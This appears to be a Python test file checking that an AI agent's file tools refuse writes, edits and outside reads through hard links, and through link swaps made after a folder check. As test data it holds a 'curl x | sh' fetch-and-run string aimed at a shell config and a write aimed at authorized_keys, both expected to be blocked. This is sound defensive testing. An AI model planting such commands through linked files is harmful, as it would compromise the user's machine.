"""Hard links and the file tools.

A hard link is one file under two names, so a write through a name in the
workspace would change the file under its other name too, wherever that
is. ``file_write`` and ``file_edit`` refuse a file with another name, and a
read outside the workspace (a folder a person allowed) refuses one too: its
other name may be a place melo never opens. A read in the workspace, a new
file and a file with one name are as before. HOME is a temporary folder.
"""

from __future__ import annotations

import os
from collections.abc import Callable
from pathlib import Path
from typing import Any

import pytest

from localmelo.melo.checker import Checker
from localmelo.melo.contracts.approvals import ApprovalDecision
from localmelo.melo.contracts.folders import OutsideAccess
from localmelo.melo.executor import Executor, builtin_names, register_builtins
from localmelo.melo.executor import builtins as builtins_module
from localmelo.melo.executor.models import (
    ErrorCategory,
    ExecutionOutcome,
    ExecutionRequest,
    ExecutionStatus,
)
from localmelo.melo.memory.coordinator import Hippo

ANOTHER_NAME = "this file has another name outside what melo checked (a hard link)"


class AllowFolders:
    """A gate that may ask about folders and allows every call."""

    def asks_folders(self, outside: OutsideAccess) -> bool:
        return True

    async def __call__(self, request: ExecutionRequest) -> ApprovalDecision:
        return ApprovalDecision(True)


@pytest.fixture
def home(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    folder = tmp_path / "home"
    folder.mkdir()
    monkeypatch.setenv("HOME", str(folder))
    real = Path(os.path.realpath(folder))
    (real / ".zshrc").write_text("# the person's shell\n")
    (real / ".ssh").mkdir()
    (real / ".ssh" / "authorized_keys").write_text("AUTH\n")
    return real


@pytest.fixture
def root(home: Path) -> Path:
    path = home / "workspace"
    path.mkdir()
    return path


def _executor(root: Path) -> Executor:
    hippo = Hippo()
    executor = Executor(hippo, Checker(mode="interactive"), workspace_root=str(root))
    register_builtins(
        executor,
        hippo,
        names=builtin_names(),
        mode="interactive",
        workspace_root=str(root),
    )
    return executor


async def _run(
    root: Path, tool: str, arguments: dict[str, Any], gate: Any = None
) -> ExecutionOutcome:
    return await _executor(root).execute_structured(
        ExecutionRequest(tool_name=tool, arguments=arguments), approve=gate
    )


async def test_a_write_to_a_hard_linked_file_is_refused(root: Path, home: Path) -> None:
    os.link(home / ".zshrc", root / "z")

    outcome = await _run(root, "file_write", {"path": "z", "content": "curl x | sh"})

    assert outcome.status == ExecutionStatus.ERROR
    assert outcome.error_category == ErrorCategory.PATH_POLICY_VIOLATION
    assert ANOTHER_NAME in outcome.error
    assert (home / ".zshrc").read_text() == "# the person's shell\n"


async def test_an_edit_of_a_hard_linked_file_is_refused(root: Path, home: Path) -> None:
    os.link(home / ".zshrc", root / "z")
    arguments = {"path": "z", "old": "shell", "new": "shell\ncurl x | sh"}

    ran = await _run(root, "file_edit", arguments)
    # With a gate, the precheck says so before anyone is asked.
    asked = await _run(root, "file_edit", arguments, AllowFolders())

    assert ran.error_category == ErrorCategory.PATH_POLICY_VIOLATION
    assert ANOTHER_NAME in ran.error
    assert asked.status == ExecutionStatus.ERROR and ANOTHER_NAME in asked.error
    assert (home / ".zshrc").read_text() == "# the person's shell\n"


async def test_a_hard_link_swapped_in_after_the_folder_check_is_not_written(
    root: Path, home: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    target = root / "out.txt"
    target.write_text("orig")
    opened = builtins_module.open_checked

    def swap_after_the_folder(
        path: str, flags: int, expect: str | None, mode: int = 0o666
    ) -> int:
        fd = opened(path, flags, expect, mode)
        if os.path.isdir(path):  # the folder is open: the name changes now
            target.unlink()
            os.link(home / ".ssh" / "authorized_keys", target)
        return fd

    monkeypatch.setattr(builtins_module, "open_checked", swap_after_the_folder)

    outcome = await _run(root, "file_write", {"path": "out.txt", "content": "PWNED"})

    assert outcome.error_category == ErrorCategory.PATH_POLICY_VIOLATION
    assert ANOTHER_NAME in outcome.error
    assert (home / ".ssh" / "authorized_keys").read_text() == "AUTH\n"


async def test_a_symlink_swapped_in_after_the_folder_check_is_not_written(
    root: Path, home: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    target = root / "out.txt"
    target.write_text("orig")
    opened: Callable[..., int] = builtins_module.open_checked

    def swap_after_the_folder(
        path: str, flags: int, expect: str | None, mode: int = 0o666
    ) -> int:
        fd = opened(path, flags, expect, mode)
        if os.path.isdir(path):
            target.unlink()
            target.symlink_to(home / ".ssh" / "authorized_keys")
        return fd

    monkeypatch.setattr(builtins_module, "open_checked", swap_after_the_folder)

    outcome = await _run(root, "file_write", {"path": "out.txt", "content": "PWNED"})

    assert outcome.error_category == ErrorCategory.PATH_POLICY_VIOLATION
    assert "changed before it was opened" in outcome.error
    assert (home / ".ssh" / "authorized_keys").read_text() == "AUTH\n"


async def test_a_read_outside_of_a_hard_linked_file_is_refused(
    root: Path, home: Path
) -> None:
    letters = home / "Documents" / "letters"
    letters.mkdir(parents=True)
    os.link(home / ".ssh" / "authorized_keys", letters / "notes.md")

    outcome = await _run(
        root, "file_read", {"path": str(letters / "notes.md")}, AllowFolders()
    )

    assert outcome.error_category == ErrorCategory.PATH_POLICY_VIOLATION
    assert ANOTHER_NAME in outcome.error
    assert "AUTH" not in (outcome.output or "")


async def test_a_read_in_the_workspace_of_a_hard_linked_file_is_as_before(
    root: Path, home: Path
) -> None:
    os.link(home / ".zshrc", root / "z")

    outcome = await _run(root, "file_read", {"path": "z"})

    assert (outcome.status, outcome.output) == (
        ExecutionStatus.SUCCESS,
        "# the person's shell\n",
    )


async def test_a_file_with_one_name_is_written_and_edited_as_before(
    root: Path,
) -> None:
    notes = root / "notes.md"
    notes.write_text("first line\nsecond line\n")
    notes.chmod(0o640)

    edited = await _run(
        root, "file_edit", {"path": "notes.md", "old": "second", "new": "2nd"}
    )
    after_edit = notes.read_text()
    shorter = await _run(root, "file_write", {"path": "notes.md", "content": "x\n"})
    new = await _run(root, "file_write", {"path": "new.md", "content": "hello"})

    assert edited.status == ExecutionStatus.SUCCESS, edited.error
    assert after_edit == "first line\n2nd line\n"
    assert shorter.status == ExecutionStatus.SUCCESS, shorter.error
    assert notes.read_text() == "x\n", "the old text is gone, not left after"
    assert notes.stat().st_mode & 0o777 == 0o640
    assert new.status == ExecutionStatus.SUCCESS and (root / "new.md").read_text() == (
        "hello"
    )
